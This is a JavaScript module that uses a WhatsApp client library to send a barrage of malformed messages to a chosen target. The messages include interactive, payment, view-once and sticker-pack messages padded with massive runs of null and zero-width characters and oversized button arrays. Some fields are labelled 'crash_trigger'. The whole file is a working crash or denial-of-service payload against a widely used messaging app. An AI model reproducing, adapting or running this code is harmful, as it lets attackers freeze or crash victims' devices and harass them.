const { proto, generateWAMessage, generateWAMessageFromContent } = require('@sakataoffc/baileys');

async function delayinfinity(sock, target) {
    try {
        const basePayload = {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: { text: " " },
                        nativeFlowMessage: {
                            buttons: "\u0000" + "\u3164".repeat(500000),
                            nativeFlowResponseMessage: {
                                buttons: Array.from({ length: 123456 }, () => ({}))
                            }
                        }
                    }
                }
            }
        };

        for (let i = 0; i < 6; i++) {
            await sock.relayMessage(target, basePayload, {});
            await new Promise(r => setTimeout(r, 50));
        }

        const msg = {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "\0".repeat(40000),
                            format: "DEFAULT"
                        },
                        footer: {
                            text: "\0".repeat(40000)
                        },
                        header: {
                            title: "/",
                            subtitle: "@Meta_Ai",
                            hasMedia: false
                        },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "call_permission_request",
                                    paramsJson: "\u0000".repeat(35000)
                                },
                                {
                                    name: "galaxy_message",
                                    paramsJson: "\x00".repeat(10000)
                                }
                            ],
                            messageVersion: 3
                        },
                        contextInfo: {
                            isForwarded: true,
                            forwardingScore: 9999,
                            forwardOrigin: 4,
                            deviceListMetadataVersion: 2,
                            messageId: null
                        }
                    }
                }
            }
        };

        await sock.relayMessage(target, msg, { noSelfSync: true });

        const msg1 = {
            interactiveMessage: {
                body: {
                    text: "\u200C".repeat(20000),
                },
                nativeFlowMessage: {
                    buttons: "\u0000".repeat(20000),
                    encryptedParams: {
                        value: "\u2066".repeat(20000),
                    },
                },
            }
        };

        const msg2 = {
            interactiveMessage: {
                body: {
                    text: "@Meta_Ai" + "\u200B".repeat(10000) + "\uFEFF".repeat(20000),
                },
                nativeFlowMessage: {
                    buttons: "meta_ai_reiviw".repeat(20000),
                },
            }
        };

        await sock.relayMessage(target, msg1, {});
        await sock.relayMessage(target, msg2, {});

        await sock.relayMessage(target, {
            interactiveMessage: {
                body: { text: "\u0000".repeat(30000) + "ြ".repeat(20000) },
                nativeFlowMessage: {
                    buttons: Array.from({ length: 3000 }, () => ({}))
                }
            }
        }, {});

        await sock.relayMessage(target, {
            extendedTextMessage: {
                text: "\u200B".repeat(30000) + "\u0000".repeat(30000),
                contextInfo: { mentionedJid: [target] }
            }
        }, {});

        const renaoffc = {
            interactiveMessage: {
                header: {
                    title: "0",
                    subtitle: "0",
                    hasMediaAttachment: true,
                    locationMessage: {
                        degreesLatitude: -98.6289790,
                        degreesLongitude: 89.9821647,
                        name: "x",
                        address: "x"
                    }
                },
                body: { text: "x" },
                footer: { text: "x" },
                nativeFlowMessage: {
                    buttons: [
                        {
                            name: "single_select",
                            buttonParamsJson: "{}"
                        },
                        {
                            name: "cta_call",
                            buttonParamsJson: JSON.stringify({
                                display_text: "𑇂𑆵𑆴𑆿".repeat(5000),
                                phone_Number: "00000000000"
                            })
                        },
                        {
                            nativeFlowMessage: {
                                buttons: "Rena_nih_dek".repeat(30000),
                                messageParamsJson: "{}"
                            },
                            name: 'address_message',
                            buttonParamsJson: "\r"
                        }
                    ],
                    messageParamsJson: '{}'
                }
            }
        };

        await sock.relayMessage(target, renaoffc, {});
        await sock.relayMessage(target, JSON.parse(JSON.stringify(renaoffc)), {});

        await sock.relayMessage(target, {
            interactiveResponseMessage: {
                contextInfo: {
                    mentionedJid: [],
                    stanzaId: 'invalid'.repeat(100),
                    participant: '0@s.whatsapp.net',
                    quotedMessage: {
                        interactiveResponseMessage: {
                            nativeFlowResponseMessage: {
                                name: 'x'.repeat(1000),
                                paramsJson: '{ "flow_cta": "' + '\u0000'.repeat(1000) + '" }',
                                version: 999
                            }
                        }
                    }
                },
                body: {
                    text: '\u200B'.repeat(50000),
                    format: 'DEFAULT'
                },
                nativeFlowResponseMessage: {
                    name: 'crash_trigger',
                    paramsJson: '{ "a": "' + 'Z'.repeat(10000) + '" }',
                    version: 999
                }
            }
        }, { participant: { jid: target } });

        await sock.relayMessage(target, {
            futureProofMessage: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "\u0000".repeat(50000),
                            format: "DEFAULT"
                        },
                        footer: {
                            text: "\u0000".repeat(50000)
                        },
                        header: {
                            title: "/",
                            subtitle: "@Meta_Ai",
                            hasMedia: false
                        },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "call_permission_request",
                                    paramsJson: "\u0000".repeat(40000)
                                },
                                {
                                    name: "galaxy_message",
                                    paramsJson: "\x00".repeat(15000)
                                }
                            ],
                            messageVersion: 3
                        }
                    }
                }
            }
        }, { participant: { jid: target } });

        await sock.relayMessage(target, {
            requestPaymentMessage: {
                currencyCodeIso4217: "IDR",
                amount1000: "99999999",
                requestFrom: target,
                noteMessage: {
                    extendedTextMessage: {
                        text: "\u200B".repeat(40000)
                    }
                },
                expiryTimestamp: Math.floor(Date.now() / 1000) + 60,
                amount: {
                    value: 99999999,
                    offset: 1000,
                    currencyCode: 'IDR'
                },
                paymentStatus: 3,
                interstitial: {
                    paymentMethod: true,
                    installmentOptions: {
                        maxInstallments: 9999
                    }
                }
            }
        }, { participant: { jid: target } });

        await sock.relayMessage(target, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "𝐑𝐄𝐍𝐀𝟒𝐘𝐎𝐔 𝐅𝐔𝐍𝐂𝐓𝐈𝐎𝐍"
                        },
                        nativeFlowMessage: {
                            extra: "\u31040",
                            buttons: "A".repeat(7000)
                        },
                        name: "craash_mesaage"
                    },
                    name: "galayx_mesaage",
                    extra1: "\u0000".repeat(5777) + "\u8000".repeat(2222)
                }
            }
        }, { participant: { jid: target } });

        await sock.relayMessage(target, {
            stickerPackMessage: {
                stickerPackId: "d06d5803-232d-4f27-97ab-6e1a56b98434",
                name: "?".repeat(1000),
                publisher: "",
                stickers: [
                    {
                        fileName: "vrPf0XE09N6FFSxWWNi44Cs6I26fGbgXqFzRRcL3E-M=.webp",
                        isAnimated: false,
                        emojis: ["☕ 🙂"],
                        accessibilityLabel: "A smiling, white cup contains a brown drink.",
                        isLottie: false,
                        mimetype: "image/webp"
                    },
                    {
                        fileName: "VTzLXxPyAt2kj1htM6q5mS1bNkdeOoq05gXN4bHRedI=.webp",
                        isAnimated: false,
                        emojis: ["😄 😀"],
                        accessibilityLabel: "A laughing, white cup is tilted to the right and contains a brown drink.",
                        isLottie: false,
                        mimetype: "image/webp"
                    }
                ],
                fileLength: "44284",
                fileSha256: "x5U7VwPORg55pOOkbcT5WluOTupd08MqQWhLJOSF1/0=",
                fileEncSha256: "HK/DWi8Hit2AH/zdl+zF+iOtOqn7sblWzv2idv/e2Fk=",
                mediaKey: "yAY8sMN8WBF4bll0iXI6qIpeMSdnUAouZmXQ9K6bBH8=",
                directPath: "/v/t62.15575-24/568790455_1348223060743345_7265249758547324723_n.enc?ccb=11-4&oh=01_Q5Aa4wEgp_5d1tX1I0lhoiARqwVzqsIDuTa6MzE_herbdRmA5A&oe=6A6EF01A&_nc_sid=5e03e0",
                contextInfo: {
                    isForwarded: true,
                    forwardingScore: 250208,
                    businessMessageForwardInfo: {
                        businessOwnerJid: "13135550002@s.whatsapp.net"
                    }
                },
                mediaKeyTimestamp: "1783073744",
                trayIconFileName: "d06d5803-232d-4f27-97ab-6e1a56b98434.png",
                thumbnailDirectPath: "/v/t62.15575-24/738340804_998258556254669_2403531129898347266_n.enc?ccb=11-4&oh=01_Q5Aa4wEeUfeh0thOBv6PkpN8i1SzwKMg-XO8zXOVMuEysGPpUw&oe=6A6EF791&_nc_sid=5e03e0",
                thumbnailSha256: "cdIWH9M9fl0pRkOhFh3I+HyMYTxExUD14juPeDrVzR8=",
                thumbnailEncSha256: "T06Qnw57tBJJ6cuwtv/SNQQiCFoMEX+5yExOn+LtzDY=",
                thumbnailHeight: 252,
                thumbnailWidth: 252,
                imageDataHash: "MjgxMzkwYzdlM2Q1MjdlM2ZkMDg3NjE4ZjViMTczMjFhNTM2ZDE1ODM1ZTA1NTVhNjM5MTYyNzkxNWVhOGZkMw==",
                stickerPackSize: "42788",
                stickerPackOrigin: "USER_CREATED"
            }
        }, { participant: { jid: target } });

        console.log(`✅ Rena4YouHard sent to ${target}`);
        return { success: true, target };

    } catch (error) {
        console.error("❌ Error:", error.message);
        return { success: false, error: error.message };
    }
}

module.exports = { delayinfinity };
